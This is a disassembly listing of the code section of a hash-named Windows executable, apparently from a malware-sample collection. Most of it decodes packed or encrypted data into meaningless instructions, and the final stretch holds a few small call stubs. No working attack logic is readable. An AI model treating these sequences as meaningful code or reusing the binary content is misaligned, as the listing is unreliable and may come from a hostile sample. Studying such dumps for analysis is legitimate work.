
2fac807b7784ff3cd5846ccaa9082d4a29fbca3cb771c3bbd8805f30ef641c14.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	fild   QWORD PTR [eax+0x701ffc2b]
  4d0006:	jp     0x4cff9c
  4d0008:	jne    0x4d0034
  4d000a:	retf   0x2d0f
  4d000d:	pop    esi
  4d000e:	xlat   BYTE PTR ds:[ebx]
  4d000f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0010:	fsub   st,st(2)
  4d0012:	out    dx,al
  4d0013:	popf   
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06ff
  4d06c1:	adc    esp,DWORD PTR [eax]
  4d06c3:	push   0x7f
  4d06c5:	stc    
  4d06c6:	or     DWORD PTR [esi+0xdddfb6d],edi
  4d06cc:	adc    dh,BYTE PTR [edx+0x81ccf0c]
  4d06d2:	cmp    BYTE PTR [edx+0x28734e5a],0x8d
  4d06d9:	jnp    0x4d06bb
  4d06db:	(bad)  
  4d06dc:	mov    ah,0xe7
  4d06de:	fs (bad) 
  4d06e0:	data16 mov dh,0x24
  4d06e3:	mov    edx,DWORD PTR [edi+0x2ec94864]
  4d06e9:	jns    0x4d06e2
  4d06eb:	or     DWORD PTR [ebx-0x1374aa01],0xffffff83
  4d06f2:	in     al,dx
  4d06f3:	cmp    al,0xb8
  4d06f5:	inc    eax
  4d06f6:	xor    BYTE PTR [ebp+0x0],cl
  4d06f9:	sub    edx,0x45
  4d06fc:	push   eax
  4d06fd:	push   0x0
  4d06ff:	call   0x4d1070
  4d0704:	add    esp,0x4
  4d0707:	pop    eax
  4d0708:	push   eax
  4d0709:	push   DWORD PTR [eax+0x1c0]
  4d070f:	push   DWORD PTR [eax+0x1b4]
  4d0715:	push   ebx
  4d0716:	push   edi
  4d0717:	call   0x4d0b64
  4d071c:	add    esp,0x10
  4d071f:	pop    eax
  4d0720:	push   eax
  4d0721:	mov    edi,0xfffffff4
  4d0726:	push   edi
  4d0727:	call   0x4d1108
  4d072c:	add    esp,0x4
  4d072f:	pop    eax
  4d0730:	add    esp,0x3c
  4d0733:	pop    ebp
  4d0734:	ret    
  4d0735:	add    BYTE PTR [eax],al
  4d0737:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d073d:	sub    esp,0x24
  4d0740:	lea    edx,ds:0x4d306c
  4d0746:	sbb    DWORD PTR [edx+0x7c],edx
  4d0749:	push   edx
  4d074a:	push   0x0
  4d074c:	call   0x4d1164
  4d0751:	add    esp,0x4
  4d0754:	pop    edx
  4d0755:	push   edx
  4d0756:	push   esi
  4d0757:	push   ebx
  4d0758:	push   eax
  4d0759:	push   DWORD PTR [edx+0x140]
  4d075f:	call   0x4d0ba4
  4d0764:	add    esp,0x10
  4d0767:	pop    edx
  4d0768:	push   edx
  4d0769:	mov    edx,0x0
  4d076e:	push   edx
  4d076f:	call   0x4d1164
  4d0774:	add    esp,0x4
  4d0777:	pop    edx
  4d0778:	add    esp,0x24
  4d077b:	pop    ebp
  4d077c:	ret    
  4d077d:	add    BYTE PTR [eax],al
  4d077f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0785:	sub    esp,0x44
  4d0788:	lea    edi,ds:0x4d3140
  4d078e:	adc    esi,DWORD PTR [edi-0x128]
  4d0794:	push   edi
  4d0795:	mov    edx,0x0
  4d079a:	push   edx
